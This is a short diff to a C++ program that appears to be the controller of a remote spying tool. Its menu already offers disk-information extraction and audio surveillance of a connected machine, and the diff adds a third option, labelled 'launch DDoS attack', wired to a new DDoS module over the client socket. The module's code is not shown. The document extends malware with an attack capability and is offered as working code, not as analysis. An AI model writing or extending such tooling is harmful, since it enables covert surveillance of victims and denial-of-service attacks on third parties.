@@ -6,6 +6,7 @@
 #include "DataContainer.h"
 #include "DiskInfoExtractor.h"
 #include "AudioSpyExtractor.h"
+#include "DDosOpenExtractor.h"
 #include "utils.h"
 #include <thread>
 #pragma comment(lib,"ws2_32.lib")
@@ -77,6 +78,7 @@ int main() {
 
     cout << "1、获取磁盘信息" << endl;
     cout << "2、语音监控" << endl;
+    cout << "3、开启DDos攻击" << endl;
     cout << "请输入功能序号" << endl;
     cin >> orinal;
     switch (orinal.c_str()[0]) {
@@ -87,6 +89,10 @@ int main() {
     case '2':
         cout << clientSocket << endl;
         clientSocket = getAudioInfo(clientSocket, serverSocket);
+        break;
+    case '3':
+        cout << clientSocket << endl;
+        clientSocket = getDDosOpenInfo(clientSocket, serverSocket);
         break;
     default:
         cout << "无此功能" << endl;
